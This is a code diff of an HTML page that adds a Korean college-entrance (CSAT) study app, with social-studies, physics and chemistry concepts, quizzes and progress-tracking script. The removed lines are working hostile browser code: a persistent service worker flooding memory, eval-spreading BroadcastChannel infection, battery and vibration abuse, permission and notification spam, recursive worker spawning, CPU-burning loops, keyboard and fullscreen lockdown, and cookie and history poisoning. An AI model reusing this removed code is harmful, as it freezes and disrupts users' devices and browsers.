+              options: ["매체가 언어 규범 제시", "사회적 관심사 결정", "정부 정책 수립", "개인 자유 확대", "문화 억제"],
+              answer: 1,
+              explanation: "의제 설정은 사회적 관심사를 결정하는 기능이다."
+            },
+            {
+              q: "사회 조사에서 신뢰도는 무엇을 의미하는가?",
+              options: ["동일한 결과 반복", "표본 크기", "조사 기간", "질문 수", "자료 저장"],
+              answer: 0,
+              explanation: "신뢰도는 반복 측정 시 동일한 결과를 얻는 정도이다."
+            },
+            {
+              q: "세계화의 부정적 효과는?",
+              options: ["문화 다양성 증가", "문화 동질화", "교류 확대", "지식 공유", "관용 증가"],
+              answer: 1,
+              explanation: "세계화는 문화 동질화를 초래할 수 있다."
+            },
+            {
+              q: "사회 불평등의 해결 방안으로 옳은 것은?",
+              options: ["교육 기회 확대", "불평등 고착", "사회 안전망 축소", "권력 집중", "계층 이동 제한"],
+              answer: 0,
+              explanation: "교육 기회 확대는 불평등 완화에 기여한다."
+            }
+          ]
+        }
+      },
+      "과학탐구": {
+        "물리학I": {
+          concepts: [
+            {
+              title: "운동의 표현",
+              content: `운동은 위치, 속도, 가속도의 변화로 표현된다. 등속 직선 운동은 속도가 일정하며, 등가속도 운동은 가속도가 일정하다. 그래프 해석을 통해 위치-시간, 속도-시간 관계를 분석할 수 있으며, 면적과 기울기의 물리적 의미를 이해해야 한다. 수능에서는 운동 그래프를 해석하여 거리, 속도, 가속도를 구하는 문제가 자주 출제된다.`
+            },
+            {
+              title: "뉴턴 운동 법칙",
+              content: `뉴턴의 제1법칙은 관성 법칙으로, 외부 힘이 없을 때 물체는 정지하거나 등속 직선 운동을 유지한다. 제2법칙은 힘과 가속도의 관계를 나타내며 F=ma로 표현된다. 제3법칙은 작용과 반작용 법칙이다. 수능에서는 힘의 평형과 운동 방정식을 설정하여 문제를 해결해야 한다.`
+            },
+            {
+              title: "일과 에너지",
+              content: `일은 힘이 물체를 이동시킬 때 발생하는 에너지 전달이며, W=F·d·cosθ로 계산된다. 운동 에너지는 1/2 mv^2, 위치 에너지는 mgh로 표현된다. 에너지 보존 법칙은 닫힌 계에서 총 에너지가 일정함을 의미한다. 수능에서는 에너지 보존을 활용해 속도, 높이, 질량 관계를 계산하는 문제가 출제된다.`
+            },
+            {
+              title: "역학적 에너지 보존",
+              content: `마찰이나 비보존력이 없을 때 운동 에너지와 위치 에너지의 합은 일정하다. 물체가 높은 곳에서 떨어질 때 위치 에너지가 운동 에너지로 전환되는 과정을 통해 에너지 보존을 이해할 수 있다. 수능에서는 경사면, 원운동 등에서 에너지 보존을 적용하여 속도와 위치를 계산하는 문제가 출제된다.`
+            },
+            {
+              title: "운동량과 충격량",
+              content: `운동량은 질량과 속도의 곱으로 정의되며, 충격량은 힘과 시간의 곱으로 운동량 변화를 나타낸다. 충돌 과정에서 외부 힘이 없으면 운동량이 보존된다. 수능에서는 탄성·비탄성 충돌 상황을 분석하고, 충격량과 운동량 보존 법칙을 적용하는 문제가 자주 나온다.`
+            },
+            {
+              title: "원운동",
+              content: `원운동은 물체가 원 궤도를 따라 움직이는 운동이며, 중심 가속도와 구심력이 필요하다. 중심 가속도는 v^2/r로 표현되고, 구심력은 mv^2/r이다. 수능에서는 원운동의 속도 변화, 회전 주기, 구심력 계산 문제를 다룬다.`
+            },
+            {
+              title: "파동의 성질",
+              content: `파동은 에너지의 전달 과정이며, 매질을 통해 전파된다. 파동은 반사, 굴절, 회절, 간섭 등의 성질을 가지며, 파동의 속도는 매질에 의해 결정된다. 수능에서는 파동의 중첩 원리와 정상파 형성을 이해하는 문제가 출제된다.`
+            },
+            {
+              title: "소리와 빛",
+              content: `소리는 기계파로 매질이 필요하며, 빛은 전자기파로 진공에서도 전파된다. 소리는 진동수와 파장에 따라 음 높이와 음색이 결정되고, 빛은 반사와 굴절, 분산 등의 현상을 가진다. 수능에서는 굴절률, 전반사, 음의 도플러 효과 등이 출제된다.`
+            },
+            {
+              title: "전기와 자기",
+              content: `전하는 전기력을 발생시키며, 전기장은 전하가 미치는 힘의 공간적 분포를 의미한다. 전류는 전하의 이동이며, 자기장은 전류와 자석 주변에 형성된다. 수능에서는 전기력, 전기장, 자기력의 방향과 크기를 계산하는 문제가 출제된다.`
+            },
+            {
+              title: "전자기 유도",
+              content: `전자기 유도는 자기장의 변화가 전류를 유도하는 현상이다. 패러데이 법칙과 렌츠 법칙을 통해 유도 전류의 방향과 크기를 결정한다. 발전기와 변압기 원리에 적용되며, 수능에서는 자기장 변화와 유도 기전력의 관계를 계산하는 문제가 출제된다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "등가속도 운동에서 속도-시간 그래프의 면적은 무엇을 의미하는가?",
+              options: ["가속도", "속도", "이동 거리", "질량", "힘"],
+              answer: 2,
+              explanation: "속도-시간 그래프의 면적은 이동 거리이다."
+            },
+            {
+              q: "뉴턴 제2법칙의 표현은?",
+              options: ["F=ma", "F=mv", "E=mc^2", "P=mv", "W=Fd"],
+              answer: 0,
+              explanation: "뉴턴 제2법칙은 F=ma이다."
+            },
+            {
+              q: "에너지 보존 법칙이 적용되는 조건은?",
+              options: ["비보존력 존재", "외부 힘 존재", "닫힌 계", "열 교환", "마찰 존재"],
+              answer: 2,
+              explanation: "닫힌 계에서 에너지 보존 법칙이 성립한다."
+            },
+            {
+              q: "운동량의 정의는?",
+              options: ["F·t", "m·v", "m·a", "W/t", "E/t"],
+              answer: 1,
+              explanation: "운동량은 m·v이다."
+            },
+            {
+              q: "원운동에서 구심력의 크기는?",
+              options: ["mv", "mv^2/r", "mr", "v/r", "m/r"],
+              answer: 1,
+              explanation: "구심력은 mv^2/r이다."
+            },
+            {
+              q: "파동의 회절 현상은 무엇을 의미하는가?",
+              options: ["파동의 직진", "장애물 뒤로 퍼짐", "속도 감소", "진폭 감소", "파장 감소"],
+              answer: 1,
+              explanation: "회절은 파동이 장애물 뒤로 퍼지는 현상이다."
+            },
+            {
+              q: "빛의 굴절은 무엇에 의해 결정되는가?",
+              options: ["질량", "굴절률", "전하", "온도", "속도"],
+              answer: 1,
+              explanation: "빛의 굴절은 매질의 굴절률에 의해 결정된다."
+            },
+            {
+              q: "전기장의 방향은 무엇을 기준으로 정의되는가?",
+              options: ["음전하", "양전하", "중성", "자기장", "전류"],
+              answer: 1,
+              explanation: "전기장의 방향은 양전하가 받는 힘의 방향으로 정의된다."
+            },
+            {
+              q: "전자기 유도의 법칙을 제시한 과학자는?",
+              options: ["뉴턴", "패러데이", "아인슈타인", "갈릴레이", "맥스웰"],
+              answer: 1,
+              explanation: "패러데이가 전자기 유도 법칙을 제시했다."
+            },
+            {
+              q: "렌츠 법칙의 의미는?",
+              options: ["유도 전류는 자기장 변화를 방해", "전류는 변화를 촉진", "전류는 항상 일정", "전기력과 무관", "자기장은 고정"],
+              answer: 0,
+              explanation: "렌츠 법칙은 유도 전류가 자기장 변화를 방해하는 방향으로 흐른다는 것이다."
+            }
+          ]
+        },
+        "화학I": {
+          concepts: [
+            {
+              title: "원자 구조",
+              content: `원자는 원자핵과 전자로 구성되며, 원자핵은 양성자와 중성자로 이루어진다. 전자는 에너지 준위에 따라 분포하며, 전자 배치는 원소의 화학적 성질을 결정한다. 수능에서는 원자 번호, 질량수, 동위 원소의 개념을 정확히 이해하고, 전자 배치 규칙을 적용하는 문제가 출제된다.`
+            },
+            {
+              title: "주기율표",
+              content: `주기율표는 원소를 원자 번호 순으로 배열한 표이며, 주기성과 족별 성질의 규칙성을 보여준다. 같은 족의 원소는 유사한 화학적 성질을 가지며, 주기에서는 원자 반지름, 이온화 에너지, 전기 음성도 등이 규칙적으로 변한다. 수능에서는 주기율표의 경향성과 원소의 성질을 연결하는 문제를 다룬다.`
+            },
+            {
+              title: "화학 결합",
+              content: `화학 결합은 원자가 안정한 전자 배치를 이루기 위해 결합하는 현상이다. 이온 결합은 전자 이동에 의해 양이온과 음이온이 결합하고, 공유 결합은 전자를 공유하여 결합한다. 금속 결합은 자유 전자에 의해 금속 원자들이 결합한다. 수능에서는 결합 유형에 따른 물질의 성질 차이를 이해해야 한다.`
+            },
+            {
+              title: "물질의 상태 변화",
+              content: `물질은 고체, 액체, 기체 상태로 존재하며, 온도와 압력 변화에 따라 상태 변화가 일어난다. 상태 변화는 잠열과 관련되며, 분자의 운동 에너지와 배열 상태 변화로 설명된다. 수능에서는 상태 변화 그래프를 분석하여 에너지 변화와 온도 유지 구간을 해석하는 문제가 출제된다.`
+            },
+            {
+              title: "기체 법칙",
+              content: `기체는 압력, 부피, 온도 사이의 관계를 가진다. 보일 법칙은 일정 온도에서 압력과 부피가 반비례함을, 샤를 법칙은 일정 압력에서 부피와 온도가 비례함을, 게이뤼삭 법칙은 일정 부피에서 압력과 온도가 비례함을 나타낸다. 수능에서는 이상 기체 방정식을 활용해 문제를 해결해야 한다.`
+            },
+            {
+              title: "용액과 농도",
+              content: `용액은 용질과 용매로 구성되며, 농도는 용액 속 용질의 양을 나타낸다. 몰 농도, 질량 백분율, 부피 백분율 등 다양한 농도 표현이 있다. 수능에서는 농도 계산과 희석 문제를 정확히 해결해야 하며, 용액의 성질 변화를 이해해야 한다.`
+            },
+            {
+              title: "산과 염기",
+              content: `산은 수소 이온을 내놓고 염기는 수산화 이온을 내놓는 물질로 정의된다. 산·염기 중화 반응은 물과 염을 생성하며, pH는 수소 이온 농도의 로그 값으로 산성도를 나타낸다. 수능에서는 중화 적정, pH 계산, 산·염기 강도 비교 문제가 자주 출제된다.`
+            },
+            {
+              title: "화학 반응과 속도",
+              content: `화학 반응 속도는 반응물의 농도, 온도, 촉매, 표면적 등에 의해 결정된다. 반응 속도는 단위 시간당 농도 변화로 표현되며, 반응 속도식을 통해 반응 차수를 분석한다. 수능에서는 농도 변화 그래프와 활성화 에너지 개념을 활용해 문제를 해결해야 한다.`
+            },
+            {
+              title: "화학 평형",
+              content: `화학 평형은 정반응과 역반응 속도가 같아지는 상태다. 평형 상수는 반응물과 생성물의 농도 비율을 나타내며, 르샤틀리에 원리에 따라 조건 변화에 대응한다. 수능에서는 평형 이동 방향을 판단하고, 평형 상수를 계산하는 문제가 출제된다.`
+            },
+            {
+              title: "산화·환원",
+              content: `산화는 전자를 잃는 과정이고 환원은 전자를 얻는 과정이다. 산화수 개념을 통해 반응에서 전자 이동을 추적할 수 있으며, 산화제와 환원제의 역할을 구분한다. 수능에서는 산화·환원 반응의 전자 이동과 전지 원리를 이해하는 문제가 출제된다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "동위 원소의 특징으로 옳은 것은?",
+              options: ["원자 번호가 다름", "질량수가 다름", "전자 수가 다름", "원자 번호가 같다", "화학 성질이 다름"],
+              answer: 1,
+              explanation: "동위 원소는 원자 번호가 같고 질량수가 다르다."
+            },
+            {
+              q: "주기율표에서 같은 족 원소의 특징은?",
+              options: ["원자 번호 동일", "유사한 화학 성질", "원자 반지름 무작위", "전자 배치 완전 동일", "질량수 동일"],
+              answer: 1,
+              explanation: "같은 족 원소는 유사한 화학 성질을 가진다."
+            },
+            {
+              q: "이온 결합의 특징은?",
+              options: ["전자 공유", "전자 이동", "자유 전자", "공유 전자쌍", "분자 결합"],
+              answer: 1,
+              explanation: "이온 결합은 전자의 이동으로 형성된다."
+            },
+            {
+              q: "상태 변화에서 잠열은 무엇과 관련 있는가?",
+              options: ["온도 변화", "분자의 운동 에너지", "분자의 배열 변화", "압력 증가", "부피 감소"],
+              answer: 2,
+              explanation: "잠열은 분자의 배열 변화와 관련된다."
+            },
+            {
+              q: "보일 법칙의 내용은?",
+              options: ["압력과 부피 비례", "압력과 부피 반비례", "온도와 부피 비례", "압력과 온도 비례", "부피와 온도 반비례"],
+              answer: 1,
+              explanation: "보일 법칙은 일정 온도에서 압력과 부피가 반비례한다."
+            },
+            {
+              q: "몰 농도의 단위는?",
+              options: ["mol/L", "g/L", "L/mol", "mol/g", "mL/mol"],
+              answer: 0,
+              explanation: "몰 농도의 단위는 mol/L이다."
+            },
+            {
+              q: "중화 반응의 생성물은?",
+              options: ["산", "염기", "물과 염", "기체", "금속"],
+              answer: 2,
+              explanation: "중화 반응은 물과 염을 생성한다."
+            },
+            {
+              q: "반응 속도를 증가시키는 요인이 아닌 것은?",
+              options: ["온도 증가", "농도 증가", "촉매 사용", "표면적 증가", "반응물 제거"],
+              answer: 4,
+              explanation: "반응물을 제거하면 반응 속도가 감소한다."
+            },
+            {
+              q: "르샤틀리에 원리의 의미는?",
+              options: ["평형은 변하지 않음", "조건 변화에 반응하여 평형 이동", "반응 속도 증가", "전자 이동", "열량 일정"],
+              answer: 1,
+              explanation: "르샤틀리에 원리는 평형이 조건 변화에 대응해 이동함을 뜻한다."
+            },
+            {
+              q: "산화·환원 반응에서 산화는 무엇인가?",
+              options: ["전자를 얻음", "전자를 잃음", "중성 유지", "수소 얻음", "산소 잃음"],
+              answer: 1,
+              explanation: "산화는 전자를 잃는 과정이다."
+            }
+          ]
+        }
+      }
+    };
 
-    <!-- ====== 7. 영구 지속형 감염 시스템 (업그레이드: PWA 설치 + 캐시 포이즌 + 워커 네스트) ====== -->
-    <script>
-        // (7-A) Service Worker 영구 백그라운드 공격 (업그레이드: 네스트 워커 + fetch 인터셉트)
-        const swCode = `
-            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
-            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-            self.addEventListener('fetch', e => e.respondWith(new Response(new Blob([new ArrayBuffer(10**9)]))));
-            self.addEventListener('message', e => {
-                setInterval(() => {
-                    fetch(location.href, { mode: 'no-cors' });
-                    new WebSocket('wss://${location.host}/sw_attack');
-                    new Worker(URL.createObjectURL(new Blob(['setInterval(() => new Worker(URL.createObjectURL(new Blob(["while(1){}"]))),1);'])));
-                }, 0.1);
-            });
+    const dashboardEl = document.getElementById("dashboard");
+    const studyViewEl = document.getElementById("studyView");
+    const conceptListEl = document.getElementById("conceptList");
+    const conceptCountEl = document.getElementById("conceptCount");
+    const quizAreaEl = document.getElementById("quizArea");
+    const subjectBadgeEl = document.getElementById("subjectBadge");
+    const studyTitleEl = document.getElementById("studyTitle");
+    const studySubtitleEl = document.getElementById("studySubtitle");
+    const scoreDisplayEl = document.getElementById("scoreDisplay");
+    const backButtonEl = document.getElementById("backButton");
+
+    const STORAGE_KEY = "csat-progress-v1";
+    const ERROR_KEY = "csat-incorrect-v1";
+    const progressState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
+    const incorrectState = JSON.parse(localStorage.getItem(ERROR_KEY) || "{}");
+
+    const state = {
+      subject: null,
+      subtopic: null,
+      questionIndex: 0,
+      showExplanation: false
+    };
+
+    const saveProgress = () => {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(progressState));
+      localStorage.setItem(ERROR_KEY, JSON.stringify(incorrectState));
+    };
+
+    const getKey = (subject, subtopic) => `${subject}::${subtopic}`;
+
+    const ensureProgress = (subject, subtopic) => {
+      const key = getKey(subject, subtopic);
+      if (!progressState[key]) {
+        progressState[key] = { correct: 0, total: 0, lastIndex: 0 };
+      }
+      if (!incorrectState[key]) {
+        incorrectState[key] = [];
+      }
+      return key;
+    };
+
+    const renderDashboard = () => {
+      dashboardEl.innerHTML = "";
+      Object.entries(CSAT_FULL_DB).forEach(([subject, subtopics]) => {
+        const card = document.createElement("div");
+        card.className = "glass rounded-2xl p-6 flex flex-col gap-4";
+        const subtopicList = Object.keys(subtopics)
+          .map((name) => `<button class=\"subtopic-btn text-left px-3 py-2 rounded-lg bg-slate-800 hover:bg-indigo-500/20 transition\" data-subtopic=\"${name}\">${name}</button>`)
+          .join("");
+        card.innerHTML = `
+          <div>
+            <h3 class="text-2xl font-semibold">${subject}</h3>
+            <p class="text-slate-400 text-sm mt-1">${Object.keys(subtopics).length}개 단원</p>
+          </div>
+          <div class="grid gap-2">
+            ${subtopicList}
+          </div>
         `;
-        
-        const blob = new Blob([swCode], { type: 'application/javascript' });
-        navigator.serviceWorker.register(URL.createObjectURL(blob)).then(reg => {
-            reg.active.postMessage({ type: 'DOOM' });
-            reg.installing.postMessage({ type: 'DOOM' });
+        card.querySelectorAll(".subtopic-btn").forEach((button) => {
+          button.addEventListener("click", () => openStudy(subject, button.dataset.subtopic));
         });
-        // PWA 설치 프롬프트 트리거
-        window.addEventListener('beforeinstallprompt', (e) => { e.prompt(); });
+        dashboardEl.appendChild(card);
+      });
+    };
 
-        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: eval 체인 + 재전파 루프)
-        const channel = new BroadcastChannel('omega_doom');
-        channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => { eval("while(1){ postMessage({cmd:\\\'INJECT\\\', code:this.code}) }"); }, 1);' });
-        channel.onmessage = (e) => {
-            if(e.data.cmd === 'INJECT') {
-                eval(e.data.code);
-                channel.postMessage(e.data);
-                setInterval(() => channel.postMessage(e.data), 1);
-            }
-        };
-    </script>
+    const renderConcepts = (concepts) => {
+      conceptCountEl.textContent = `${concepts.length}개`;
+      conceptListEl.innerHTML = "";
+      concepts.forEach((concept) => {
+        const item = document.createElement("div");
+        item.className = "bg-slate-900/60 rounded-xl p-4 border border-slate-700";
+        item.innerHTML = `
+          <h4 class="text-lg font-semibold text-indigo-200">${concept.title}</h4>
+          <p class="text-slate-300 mt-2 leading-relaxed">${concept.content}</p>
+        `;
+        conceptListEl.appendChild(item);
+      });
+    };
 
-    <!-- ====== 8. 배터리/센서 초과사용 시스템 (업그레이드: 멀티 센서 리스너 + 진동 패턴) ====== -->
-    <script>
-        // (8-A) 배터리 고갈 공격 (업그레이드: 충전 감지 리로드 + wakelock)
-        navigator.getBattery().then(battery => {
-            battery.addEventListener('chargingchange', () => location.reload());
-        });
-        navigator.wakeLock.request('screen');
+    const renderQuiz = (quizzes, subject, subtopic) => {
+      const key = ensureProgress(subject, subtopic);
+      const progress = progressState[key];
+      const quiz = quizzes[state.questionIndex];
+      const incorrect = incorrectState[key];
+      scoreDisplayEl.textContent = `${progress.correct}/${progress.total}`;
 
-        // (8-B) 센서 과부하 (자이로, 가속도, 빛, 근접 등)
-        if (window.DeviceMotionEvent) window.addEventListener('devicemotion', () => {}, true);
-        if (window.DeviceOrientationEvent) window.addEventListener('deviceorientation', () => {}, true);
-        if (window.AmbientLightSensor) new AmbientLightSensor().start();
-        if (window.ProximitySensor) new ProximitySensor().start();
-        setInterval(() => {
-            navigator.vibrate(new Array(1000).fill(1000)); // 무한 진동 패턴
-        }, 1);
+      quizAreaEl.innerHTML = `
+        <div class="flex items-center justify-between gap-4">
+          <div>
+            <p class="text-indigo-300 text-sm">문항 ${state.questionIndex + 1} / ${quizzes.length}</p>
+            <h4 class="text-xl font-semibold mt-1">${quiz.q}</h4>
+          </div>
+          <button id="toggleExplanation" class="px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition">
+            ${state.showExplanation ? "해설 숨기기" : "해설 보기"}
+          </button>
+        </div>
+        <form id="quizForm" class="mt-4 space-y-3">
+          ${quiz.options
+            .map(
+              (option, idx) => `
+                <label class="flex items-start gap-3 bg-slate-900/70 border border-slate-700 rounded-xl p-3 cursor-pointer hover:border-indigo-400 transition">
+                  <input type="radio" name="answer" value="${idx}" class="mt-1" />
+                  <span class="text-slate-200">${option}</span>
+                </label>
+              `
+            )
+            .join("")}
+          <div class="flex flex-wrap items-center gap-3 pt-2">
+            <button type="submit" class="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-400 text-white font-semibold">정답 확인</button>
+            <button type="button" id="prevQuestion" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700">이전</button>
+            <button type="button" id="nextQuestion" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700">다음</button>
+            <button type="button" id="reviewIncorrect" class="px-4 py-2 rounded-lg bg-rose-500/80 hover:bg-rose-400">오답 보기 (${incorrect.length})</button>
+          </div>
+          <div id="feedback" class="mt-4"></div>
+          <div id="explanation" class="mt-4 ${state.showExplanation ? "" : "hidden"}">
+            <h5 class="text-indigo-300 font-semibold">해설</h5>
+            <p class="text-slate-300 mt-2 leading-relaxed">${quiz.explanation}</p>
+          </div>
+        </form>
+      `;
 
-        // (8-C) 클립보드/노티피케이션/퍼미션 스팸
-        setInterval(() => {
-            navigator.clipboard.writeText('DOOM'.repeat(10**7));
-            new Notification('TERMINATOR', { body: 'SYSTEM DOWN'.repeat(1000), silent: false, requireInteraction: true });
-            Notification.requestPermission();
-            navigator.mediaDevices.getUserMedia({audio: true, video: true});
-        }, 1);
-    </script>
+      const quizForm = document.getElementById("quizForm");
+      const feedbackEl = document.getElementById("feedback");
+      const explanationEl = document.getElementById("explanation");
+      const toggleExplanationEl = document.getElementById("toggleExplanation");
 
-    <!-- ====== 9. 워커 풀 핵폭발 시스템 (업그레이드: 네스트 워커 + 메시지 플러드 체인) ====== -->
-    <script>
-        // (9-A) Worker 무한 스폰과 메시지 플러드 (업그레이드: 재귀 스폰)
-        function spawnWorkers(depth = 5) {
-            if(depth > 0) {
-                for(let i=0; i<200; i++) {
-                    const worker = new Worker(URL.createObjectURL(new Blob([`setInterval(() => postMessage(new ArrayBuffer(10**8)),1); spawnWorkers(${depth-1});`])));
-                    worker.onmessage = () => {};
-                }
-            } else {
-                while(true) { postMessage(new ArrayBuffer(10**8)); }
-            }
-            setTimeout(() => spawnWorkers(depth), 10);
+      toggleExplanationEl.addEventListener("click", () => {
+        state.showExplanation = !state.showExplanation;
+        renderQuiz(quizzes, subject, subtopic);
+      });
+
+      quizForm.addEventListener("submit", (event) => {
+        event.preventDefault();
+        const selected = quizForm.querySelector("input[name='answer']:checked");
+        if (!selected) {
+          feedbackEl.innerHTML = `<p class="text-amber-300">정답을 선택해 주세요.</p>`;
+          return;
         }
-        spawnWorkers();
-    </script>
+        const value = Number(selected.value);
+        progress.total += 1;
+        if (value === quiz.answer) {
+          progress.correct += 1;
+          feedbackEl.innerHTML = `<p class="text-emerald-300 font-semibold">정답입니다! 개념을 잘 이해하고 있습니다.</p>`;
+          const incorrectIndex = incorrect.indexOf(state.questionIndex);
+          if (incorrectIndex !== -1) {
+            incorrect.splice(incorrectIndex, 1);
+          }
+        } else {
+          feedbackEl.innerHTML = `<p class="text-rose-300 font-semibold">오답입니다. ${quiz.options[quiz.answer]}가 정답입니다.</p>`;
+          if (!incorrect.includes(state.questionIndex)) {
+            incorrect.push(state.questionIndex);
+          }
+        }
+        saveProgress();
+        scoreDisplayEl.textContent = `${progress.correct}/${progress.total}`;
+      });
 
-    <!-- ====== 10. 신규: 크립토 마이닝 + 리소스 호그 시스템 ====== -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script>
-        // (10-A) 크립토 마이닝 오버로드
-        setInterval(() => {
-            for(let i=0; i<1000; i++) {
-                CryptoJS.SHA256('mine' + Math.random()).toString();
-            }
-        }, 1);
+      document.getElementById("prevQuestion").addEventListener("click", () => {
+        state.questionIndex = (state.questionIndex - 1 + quizzes.length) % quizzes.length;
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
 
-        // (10-B) 리소스 호그 (미디어, 카메라, 마이크)
-        navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(stream => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-            }, 1);
-        });
-    </script>
+      document.getElementById("nextQuestion").addEventListener("click", () => {
+        state.questionIndex = (state.questionIndex + 1) % quizzes.length;
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
 
-    <!-- ====== 11. 신규: 브라우저 락다운 + 히스토리/쿠키 포이즌 ====== -->
-    <script>
-        // (11-A) 브라우저 락다운 (풀스크린 + 포인터 락 + 키보드 트랩)
-        document.addEventListener('keydown', e => e.preventDefault());
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        setInterval(() => {
-            document.documentElement.requestFullscreen();
-            document.documentElement.requestPointerLock();
-        }, 1);
+      document.getElementById("reviewIncorrect").addEventListener("click", () => {
+        if (incorrect.length === 0) {
+          feedbackEl.innerHTML = `<p class="text-slate-300">현재 오답 노트가 비어 있습니다.</p>`;
+          return;
+        }
+        state.questionIndex = incorrect[0];
+        progress.lastIndex = state.questionIndex;
+        saveProgress();
+        renderQuiz(quizzes, subject, subtopic);
+      });
+    };
 
-        // (11-B) 히스토리/쿠키 포이즌
-        setInterval(() => {
-            history.pushState({}, '', '/' + Math.random());
-            document.cookie = `doom=${'X'.repeat(10**6)}; max-age=31536000; path=/`;
-        }, 1);
-    </script>
+    const openStudy = (subject, subtopic) => {
+      state.subject = subject;
+      state.subtopic = subtopic;
+      const data = CSAT_FULL_DB[subject][subtopic];
+      const key = ensureProgress(subject, subtopic);
+      state.questionIndex = progressState[key].lastIndex || 0;
+      state.showExplanation = false;
+
+      subjectBadgeEl.textContent = subject;
+      studyTitleEl.textContent = subtopic;
+      studySubtitleEl.textContent = `${subject} · ${subtopic} 핵심 개념과 기출 스타일 문제를 학습하세요.`;
+
+      renderConcepts(data.concepts);
+      renderQuiz(data.quizzes, subject, subtopic);
+      studyViewEl.classList.remove("hidden");
+      studyViewEl.scrollIntoView({ behavior: "smooth" });
+    };
+
+    backButtonEl.addEventListener("click", () => {
+      studyViewEl.classList.add("hidden");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+
+    renderDashboard();
+  </script>
 </body>
-    </html>
+</html>
